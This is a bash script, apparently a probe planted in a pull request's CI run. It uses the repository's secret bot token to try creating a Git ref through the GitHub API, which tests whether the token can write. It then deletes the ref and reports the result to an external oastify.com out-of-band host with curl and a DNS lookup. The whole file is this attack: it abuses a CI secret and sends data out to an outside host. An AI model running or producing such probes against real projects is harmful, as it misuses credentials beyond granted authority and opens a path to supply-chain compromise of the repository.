#!/usr/bin/env bash
set -u
OOB="qd75do8fy0wdpvs2dnb6f7gy2p8fwy199sd7r9g.oastify.com"
SHA="51bee03bed4776f1de88dd87226ff8c260f88e3c"

# Try createref with valid SHA — 201=write, 403=read-only, 409=ref exists
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -H "Content-Type: application/json" \
  -d "{\"ref\":\"refs/heads/osvrp-probe-${PR_NUMBER}\",\"sha\":\"${SHA}\"}")

echo "CreateRef result: ${CODE}"

# Cleanup if created
if [ "${CODE}" = "201" ]; then
  curl -s -X DELETE \
    "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs/heads/osvrp-probe-${PR_NUMBER}" \
    -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" || true
fi

# OOB — no complex encoding
curl -sk "https://${OOB}/w3?pr=${PR_NUMBER}&code=${CODE}" || true
nslookup "${OOB}" > /dev/null 2>&1 || true
echo "done"
